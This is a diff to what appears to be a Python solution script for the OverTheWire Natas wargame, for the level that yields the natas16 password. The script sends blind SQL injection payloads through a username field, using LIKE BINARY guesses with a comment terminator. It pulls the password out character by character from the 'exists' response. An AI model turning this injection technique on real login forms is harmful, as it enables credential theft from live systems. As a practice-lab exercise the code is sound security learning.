@@ -9,6 +9,19 @@ from variables import auth, URL, CHARS, NAME
 
 # Variables
 password = ""
+filtered_characters = ""
+
+
+for character in CHARS:
+    respones = post(
+        URL,
+        data={
+            "username": f'{NAME}" AND password LIKE BINARY "%{character}%" #'
+        },
+        auth=auth
+    )
+    if "exists" in respones.text:
+        filtered_characters += character
 
 
 def get_respones(character: str) -> str:
@@ -23,18 +36,20 @@ def get_respones(character: str) -> str:
     respones = post(
         URL,
         data={
-            "username": f'{NAME}" AND password LIKE BINARY "{password}{character}%" -- '
+            "username": f'{NAME}" AND password LIKE BINARY "{password}{character}%" #'
         },
         auth=auth
     )
-    if "This user exists" in respones.text:
+    if "exists" in respones.text:
         return character
     return ''
 
 
+print(f"Currect characters: {filtered_characters}")
+
 while len(password) < 32:
     print(f"length: {len(password)}, password: {password}")
-    for testing_character in CHARS:
+    for testing_character in filtered_characters:
         current_char = get_respones(testing_character)
         if current_char:
             password += current_char
@@ -42,5 +57,5 @@ while len(password) < 32:
 
 print("-"*64)
 print("Link: http://natas16.natas.labs.overthewire.org/index.php")
-print(f"Username: natas16")
+print("Username: natas16")
 print(f"Password: {password}")
